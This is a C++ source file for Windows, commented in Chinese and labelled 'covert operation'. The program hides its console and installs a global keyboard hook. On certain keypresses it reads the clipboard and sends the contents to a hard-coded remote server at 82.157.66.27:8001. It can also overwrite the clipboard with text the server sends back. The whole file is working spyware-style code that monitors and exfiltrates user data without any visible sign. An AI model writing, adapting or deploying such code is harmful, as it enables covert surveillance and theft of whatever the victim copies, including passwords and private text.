//暗中操作
#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <iostream>
#include <conio.h>
#include<winsock.h>
#include <string>
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )//不显示控制台
#pragma comment(lib,"ws2_32.lib")
using namespace std;
void mfunction(int index);
void cleanBuff(SOCKET sock_conn);
HHOOK keyboardHook = 0;		// 钩子句柄、
//定义长度变量
int send_len = 0;
int recv_len = 0;
//定义发送缓冲区和接受缓冲区
string send_buf;
char recv_buf[9999];//字符缓冲区
//定义服务端套接字，接受请求套接字
SOCKET s_server;
//服务端地址客户端地址
SOCKADDR_IN server_addr;
HGLOBAL hMemBin = NULL;
PCHAR   LockBin = NULL;
PCHAR   TempBin = NULL;
LRESULT CALLBACK LowLevelKeyboardProc(
	_In_ int nCode,		// 规定钩子如何处理消息，小于 0 则直接 CallNextHookEx
	_In_ WPARAM wParam,	// 消息类型
	_In_ LPARAM lParam	// 指向某个结构体的指针，这里是 KBDLLHOOKSTRUCT（低级键盘输入事件）
) {
	KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;		// 包含低级键盘输入事件信息
	/*
	typedef struct tagKBDLLHOOKSTRUCT {
		DWORD     vkCode;		// 按键代号
		DWORD     scanCode;		// 硬件扫描代号，同 vkCode 也可以作为按键的代号。
		DWORD     flags;		// 事件类型，一般按键按下为 0 抬起为 128。
		DWORD     time;			// 消息时间戳
		ULONG_PTR dwExtraInfo;	// 消息附加信息，一般为 0。
	}KBDLLHOOKSTRUCT,*LPKBDLLHOOKSTRUCT,*PKBDLLHOOKSTRUCT;
	*/
	if (ks->flags == 128 || ks->flags == 129)
	{
		// 监控键盘
		switch (ks->vkCode) {
		case 0x30: case 0x60:
			mfunction(0);
			break;
		case 0x31: case 0x61:
			mfunction(1);
			break;
		case 0xC0:
			exit(0);
			break;
		}
		//return 1;		// 使按键失效
	}
	// 将消息传递给钩子链中的下一个钩子
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
void createSocket();
void initialization();
int main() {
	SetConsoleOutputCP(936);
	createSocket();
	// 安装钩子
	keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,			// 钩子类型，WH_KEYBOARD_LL 为键盘钩子
		LowLevelKeyboardProc,	// 指向钩子函数的指针
		GetModuleHandleA(NULL),	// Dll 句柄
		NULL
	);
	if (keyboardHook == 0) {
		//cout << "挂钩键盘失败" << endl; return -1;
	}

	//不可漏掉消息处理，不然程序会卡死
	MSG msg;
	while (1)
	{
		// 如果消息队列中有消息
		if (PeekMessageA(
			&msg,		// MSG 接收这个消息
			NULL,		// 检测消息的窗口句柄，NULL：检索当前线程所有窗口消息
			NULL,		// 检查消息范围中第一个消息的值，NULL：检查所有消息（必须和下面的同时为NULL）
			NULL,		// 检查消息范围中最后一个消息的值，NULL：检查所有消息（必须和上面的同时为NULL）
			PM_REMOVE	// 处理消息的方式，PM_REMOVE：处理后将消息从队列中删除
		)) {
			// 把按键消息传递给字符消息
			TranslateMessage(&msg);

			// 将消息分派给窗口程序
			DispatchMessageW(&msg);
		}
		else
			Sleep(0);    //避免CPU全负载运行
	}
	// 删除钩子
	UnhookWindowsHookEx(keyboardHook);
	//关闭套接字
	closesocket(s_server);
	//释放DLL资源
	WSACleanup();
	return 0;
}
void initialization() {
	//初始化套接字库
	WORD w_req = MAKEWORD(2, 2);//版本号
	WSADATA wsadata;
	int err;
	err = WSAStartup(w_req, &wsadata);
	if (err != 0) {
		//cout << "初始化套接字库失败！" << endl;
	}
	else {
		//cout << "初始化套接字库成功！" << endl;
	}
	//检测版本号
	if (LOBYTE(wsadata.wVersion) != 2 || HIBYTE(wsadata.wHighVersion) != 2) {
		//cout << "套接字库版本号不符！" << endl;
		WSACleanup();
	}
	else {
		//cout << "套接字库版本正确！" << endl;
	}
	//填充服务端地址信息

}
void mfunction(int index) {
	switch (index)
	{
	case 1:
		if (OpenClipboard(NULL)) {
			hMemBin = GetClipboardData(CF_TEXT);
			LockBin = (PCHAR)GlobalLock(hMemBin);
			TempBin = (PCHAR)malloc(GlobalSize(hMemBin));
			if (TempBin != NULL)
			{
				RtlMoveMemory(TempBin, LockBin, GlobalSize(hMemBin));
			}
			GlobalUnlock(hMemBin);
			LockBin = NULL;
			CloseClipboard();
			send_buf = std::to_string(1) + TempBin;
			send_len = send(s_server, send_buf.c_str(), send_buf.length(), 0);
			if (send_len < 0) {
				//cout << "发送失败！" << endl;
				break;
			}
			if (TempBin != NULL)
			{
				free(TempBin);
				TempBin = NULL;
			}
		}
		break;
	case 0:
		cleanBuff(s_server);
		if (OpenClipboard(NULL)) {
			hMemBin = GetClipboardData(CF_TEXT);
			LockBin = (PCHAR)GlobalLock(hMemBin);
			TempBin = (PCHAR)malloc(GlobalSize(hMemBin));
			if (TempBin != NULL)
			{
				RtlMoveMemory(TempBin, LockBin, GlobalSize(hMemBin));
			}
			GlobalUnlock(hMemBin);
			LockBin = NULL;
			CloseClipboard();
			send_buf = std::to_string(0) + TempBin;
			send_len = send(s_server, send_buf.c_str(), send_buf.length(), 0);
			if (send_len < 0) {
				//cout << "发送失败！" << endl;
				break;
			}
			if (TempBin != NULL)
			{
				free(TempBin);
				TempBin = NULL;
			}
			recv_len = recv(s_server, recv_buf, 9999, 0);
			if (recv_len > 0)
			{
				//cout << recv_buf;
				if (OpenClipboard(NULL)) {
					EmptyClipboard();
					hMemBin = GlobalAlloc(GMEM_MOVEABLE, 10000);
					LockBin = (PCHAR)GlobalLock(hMemBin);
					RtlMoveMemory(LockBin, recv_buf, 9999);
					GlobalUnlock(hMemBin);
					LockBin = NULL;
					SetClipboardData(CF_TEXT, hMemBin);
					CloseClipboard();
				}
			}
		}
		break;
	default:
		break;
	}
}
void cleanBuff(SOCKET sock_conn) {
	// 设置select立即返回
	timeval time_out;
	time_out.tv_sec = 0;
	time_out.tv_usec = 0;

	// 设置select对sock_conn的读取感兴趣
	fd_set read_fds;
	FD_ZERO(&read_fds);
	FD_SET(sock_conn, &read_fds);

	int res = -1;
	char recv_data[2];
	memset(recv_data, 0, sizeof(recv_data));
	while (true) {
		res = select(FD_SETSIZE, &read_fds, nullptr, nullptr, &time_out);
		if (res == 0) break;  //数据读取完毕，缓存区清空成功
		recv(sock_conn, recv_data, 1, 0);  //触发数据读取
	}
}
void createSocket() {
	initialization();
	//填充服务端信息
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.S_un.S_addr = inet_addr("82.157.66.27");
	server_addr.sin_port = htons(8001);
	//创建套接字
	s_server = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(s_server, (SOCKADDR*)&server_addr, sizeof(SOCKADDR)) == SOCKET_ERROR) {
		//cout << "服务器连接失败！" << endl;
		WSACleanup();
	}
	else {
		//cout << "服务器连接成功！" << endl;
	}
}